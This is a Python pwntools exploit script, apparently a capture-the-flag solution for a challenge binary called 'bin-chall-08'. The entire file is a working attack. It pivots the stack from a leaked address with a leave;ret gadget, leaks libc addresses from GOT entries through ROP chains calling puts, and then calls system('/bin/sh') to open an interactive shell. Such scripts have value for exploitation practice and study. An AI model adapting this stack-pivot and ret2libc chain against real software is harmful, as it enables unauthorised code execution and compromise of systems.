#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-08")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def pivot():
    io.recvuntil(b"address: ")

    # [rbp-0x20]
    stack_leak = int(io.recvline(keepends=False), 16)
    pivot_addr = stack_leak + 0x20 - 0xa0
    pivot_payload = b"A" * pad
    pivot_payload += p64(pivot_addr)
    pivot_payload += p64(leave_ret)

    io.sendafter(b"Input 1: ", pivot_payload)


def leak(got_addr: int, label: str) -> int:
    pivot()
    payload = flat(elf.bss(0x100), ret, pop_rdi, got_addr, puts_plt)
    payload += flat(ret, main)

    io.sendafter(b"Input 2: ", payload)

    leak_addr = u64(io.recv(6).ljust(8, b"\x00"))
    log.info(f"{label}: {leak_addr:#x}")
    return leak_addr


env = {}
io = start()

pad = 0x60

leave_ret = 0x4012d5
pop_rdi = 0x401343
ret = pop_rdi + 1

main = elf.symbols["main"]
read_got = elf.got["read"]
printf_got = elf.got["printf"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

leak_puts = leak(puts_got, "puts")
leak_printf = leak(printf_got, "printf")
leak_read = leak(read_got, "read")

libc = ELF("./libc.so")
libc.address = leak_puts - libc.symbols["puts"]
log.info(f"{libc.address=:#x}")
system = libc.symbols["system"]
bin_sh_str = next(libc.search(b"/bin/sh\x00"))

pivot()
payload = flat(elf.bss(0x100), ret, pop_rdi, bin_sh_str, system)
io.sendafter(b"Input 2: ", payload)

io.interactive()
